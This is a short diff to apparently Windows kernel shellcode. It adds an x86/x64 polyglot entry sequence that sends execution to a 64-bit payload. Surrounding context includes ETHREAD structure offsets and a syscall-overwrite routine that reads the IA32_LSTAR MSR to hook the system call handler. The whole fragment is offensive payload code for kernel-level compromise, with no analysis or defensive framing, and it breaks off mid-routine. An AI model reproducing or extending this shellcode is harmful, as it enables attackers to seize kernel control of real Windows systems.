@@ -74,9 +74,19 @@ ETHREAD_THREADLISTENTRY_OFFSET             equ     0x420   ; only used if STATIC
 ; now the shellcode begins
 payload_start:
 
-%ifdef SYSCALL_OVERWRITE
-syscall_overwrite:
+  xor ecx, ecx
+  db 0x41                   ; x86 inc ecx, x64 = rex prefix
+  loop x64_payload_start    ; dec, jnz. i.e. in x64 we will now jmp
 
+%ifdef USE_X86
+%else
+  ret
+%end
+
+x64_payload_start:
+BITS 64
+
+%ifdef SYSCALL_OVERWRITE
 x64_syscall_overwrite:
   mov ecx, 0xc0000082                               ; IA32_LSTAR syscall MSR
   rdmsr
